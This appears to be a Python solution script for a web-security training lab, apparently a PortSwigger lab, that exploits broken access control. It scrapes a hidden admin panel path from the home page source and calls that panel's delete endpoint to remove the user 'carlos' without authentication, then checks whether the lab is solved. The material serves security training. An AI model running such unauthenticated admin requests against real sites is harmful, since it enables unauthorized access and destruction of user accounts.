import sys
import re
import requests

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def goto_administrator_panel(url):

    print()
    print(f"[*] Sending request as GET {url}/")
    print()

    s = requests.Session()
    response = s.get(url)

    print("Response output:")
    print(response.text)

    admin_path = re.search(r"admin-[a-zA-z0-9]+'", response.text).group().strip().replace("'", "")

    print(f"Admin path: {admin_path}")

    url = url + f"/{admin_path}" + "/delete"

    data = {
        "username": "carlos"
    }

    response = s.get(url, params=data)


    print()
    print(f"Request Method: {response.request.method}")
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: python file.py https://website.net")
    else:
        url = sys.argv[1].strip("/")
        goto_administrator_panel(url)
        verify_if_lab_solved(url)
